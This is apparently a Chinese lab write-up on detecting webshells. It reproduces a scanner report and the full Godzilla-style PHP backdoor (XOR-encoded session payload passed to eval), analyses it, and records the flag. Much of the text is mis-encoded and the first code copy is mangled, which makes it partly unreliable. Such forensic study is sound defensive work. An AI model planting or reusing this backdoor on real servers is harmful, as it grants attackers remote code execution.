### WebShell æŸ¥æ€

è¯ä¸å¤šè¯´ï¼Œç›´æ¥ä¸Šé¢˜ï¼ˆç„æœºé¶åœºï¼‰

![](https://pic1.imgdb.cn/item/681c759258cb8da5c8e58a47.png)

#### é»‘å®¢ WebShell é‡Œé¢çš„ flag

æ¨èæŠŠæ–‡ä»¶ dump ä¸‹æ¥

```
tar -czvf html.tar.gz ./
```

ç„¶åä½¿ç”¨ D ç›¾æ‰«æ

![](https://pic1.imgdb.cn/item/681c7b5158cb8da5c8e5914f.png)

```
 id      çº§åˆ«  å¤§å°       CRC        ä¿®æ”¹æ—¶é—´             æ–‡ä»¶ (è¯´æ˜)
 --------------------------------------------------------------------------------------------------------------------------------------------
 00001   4     38         FEE1C229   23-08-02 10:52:25    \html\shell.php     ã€Evalåé—¨ {å‚æ•°:$_REQUEST[1]}ã€
 00002   4     808        3F54B485   23-08-02 10:56:39    \html\include\gz.php  ã€(å†…è—)Evalåé—¨ {å‚æ•°:encode($_SESSION[$payloadName],"3c6e0b8a9c15224a")}ã€
 00003   3     205        D6CF6AC8   23-08-02 16:56:29    \html\wap\top.php   ã€å˜é‡å‡½æ•°[$c($fun)]|å¯ç–‘æ–‡ä»¶ã€
 00004   4     768        3DEFBD91   23-08-02 11:01:06    \html\include\Db\.Mysqli.php  ã€(å†…è—)Evalåé—¨ {å‚æ•°:encode($_SESSION[$payloadName],"3c6e0b8a9c15224a")}ã€
 --------------------------------------------------------------------------------------------------------------------------------------------
```

è¿™é‡ŒçŒœæµ‹ WebShell åº”è¯¥å°±æ˜¯ `gz.php`

```php
<?php  
@session_start();  
@set_time_limit(0);  
@error_reporting(0);  
function encode($D,$K){  
    for($i=0;$i<strlen($D);$i++) {  
        $c =$K[$i+1&15];  
        $D[$i] = $D[$i]^$c;  
    }  
    return $D;  
}  
//027ccd04-5065-48b6-a32d-77c704a5e26d  
$payloadName='payload';  
$key='3c6e0b8a9c15224a';  
$data=file_get_contents("php://input");  
if ($data!==false){==    ==$data=encode($==â€‹==data,$key);if (isset(==â€‹==$_SESSION[$==â€‹==payloadName])){==        ==$payload=encode($==â€‹==_SESSION[==â€‹==$payloadName],$==â€‹==key);if (strpos($payload,&quot;getBasicsInfo&quot;)===false){==            ==$payload=encode($==â€‹==payload,$key);}eval($payload);echo encode(@run(==â€‹==$data),$==â€‹==key);}else{if (strpos($data,&quot;getBasicsInfo&quot;)!==false){  
            $_SESSION[$payloadName]=encode($data,$key);  
        }  
    }  
}
```

ç®€å•åˆ†æä¸€ä¸‹è¿™æ®µæ¶æ„ä»£ç ï¼›

```php
@session_start();  
@set_time_limit(0);  
@error_reporting(0);
```

**`@session_start()`**ï¼šå¯åŠ¨ PHP ä¼šè¯ï¼Œç”¨äºä¿å­˜ payloadï¼Œå®ç°æŒä¹…åŒ–æ§åˆ¶

**`@set_time_limit(0)`**ï¼šå–æ¶ˆè„šæœ¬æ‰§è¡Œæ—¶é—´é™åˆ¶ï¼Œæ–¹ä¾¿é•¿æ—¶é—´è¿è¡Œ

**`@error_reporting(0)`**ï¼šå…³é—­æ‰€æœ‰é”™è¯¯æŠ¥å‘Šï¼Œç”¨äºéšè—å¼‚å¸¸ï¼Œé¿å…æš´éœ²æ¶æ„ä»£ç 

```php
function encode($D,$K){  
    for($i=0;$i<strlen($D);$i++) {  
        $c =$K[$i+1&15];  
        $D[$i] = $D[$i]^$c;  
    }  
    return $D;  
}
```

ğŸ”**åŠ è§£å¯†å‡½æ•° encode($D, $K)**

- `^` æ˜¯æŒ‰ä½å¼‚æˆ–æ“ä½œï¼Œæ‰§è¡Œçš„æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†
- `$K[$i+1 & 15]` å– key çš„æŸä¸€ä½è¿›è¡Œ XOR
  - `& 15` ç­‰ä»·äº `mod 16`ï¼Œä¿è¯ `$K` ç”¨çš„æ˜¯å‰ 16 ä¸ªå­—ç¬¦
- æ¯æ¬¡è¿è¡Œ encode éƒ½æ˜¯åŒä¸€åŠ å¯†è¿‡ç¨‹ï¼Œ**å†æ¬¡ encode ç›¸å½“äºè§£å¯†**

```php
$key='3c6e0b8a9c15224a';  
$data=file_get_contents("php://input");
```

`php://input` ç”¨äºæ¥æ”¶åŸå§‹ POST æ•°æ®ï¼ˆé `$_POST[]` çš„æ–¹å¼ï¼‰ï¼Œå¸¸ç”¨äºæ¥æ”¶äºŒè¿›åˆ¶æ•°æ®æˆ–ç»•è¿‡é˜²æŠ¤

`$key` æ˜¯æ”»å‡»è€…è®¾ç½®çš„å¯†é’¥ï¼Œç”¨äºæ•°æ®åŠ å¯†è§£å¯†

```php
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key); // å†æ¬¡è§£å¯†
        }
        eval($payload); // æ‰§è¡Œè§£å¯†åçš„ payload
        echo encode(@run($data),$key); // å›æ˜¾æ‰§è¡Œç»“æœ
    } else {
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key); // å­˜å‚¨ payloadï¼ˆå·²åŠ å¯†ï¼‰
        }
    }
}
```

**ğŸ”¸ é˜¶æ®µä¸€ï¼šå­˜å‚¨ Payloadï¼ˆSession æŒä¹…åŒ–ï¼‰**

- æ”»å‡»è€…å‘é€å¸¦æœ‰å­—ç¬¦ä¸² `"getBasicsInfo"` çš„ç‰¹åˆ¶ payloadï¼ˆç»è¿‡ encode åŠ å¯†ï¼‰
- è„šæœ¬åˆ¤æ–­æ˜¯å¦å«æœ‰è¯¥ç‰¹å¾å­—ç¬¦ä¸²
- å¦‚æœæ˜¯ï¼Œåˆ™å°†å…¶åŠ å¯†åå†™å…¥ `$_SESSION[$payloadName]`

**ğŸ”¸ é˜¶æ®µäºŒï¼šæ‰§è¡Œ Payload**

- æ”»å‡»è€…å†æ¬¡è®¿é—®æ­¤è„šæœ¬ï¼ŒPOST åŠ å¯†çš„å‘½ä»¤æ•°æ®
- è„šæœ¬ä» session ä¸­å–å‡º payloadï¼Œè¿›è¡Œ **1 æ¬¡æˆ– 2 æ¬¡è§£å¯†**ï¼ˆæ ¹æ®æ˜¯å¦ä»å«æœ‰ `"getBasicsInfo"` å­—æ ·ï¼‰
- ç„¶å `eval($payload)` æ‰§è¡Œè¿™ä¸ª payloadï¼ˆ**å…¸å‹ RCE**ï¼‰
- æœ€åï¼Œè°ƒç”¨ payload ä¸­å®šä¹‰çš„ `run($data)` å‡½æ•°ï¼Œå°†åˆšæ‰ä¼ å…¥çš„åŠ å¯†å‘½ä»¤ä½œä¸ºå‚æ•°ï¼Œå¹¶å°†å…¶è¿”å›ç»“æœåŠ å¯†åè¾“å‡º

```
flag1ï¼šflag{027ccd04-5065-48b6-a32d-77c704a5e26d}
```

#### é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„ Shell

é‡åˆ°è¿™ç§ç±»å‹çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å°±æ˜¯è¦åˆ†æä¸€ä¸‹æ˜¯ä»€ä¹ˆç±»å‹çš„ WebShell

å…¶å®å¼€å¤´ä¸‰å¥å°±å¯ä»¥åˆ†æå‡ºæ˜¯å“¥æ–¯æ‹‰çš„äº†

```
@session_start();  
@set_time_limit(0);  
@error_reporting(0);
```
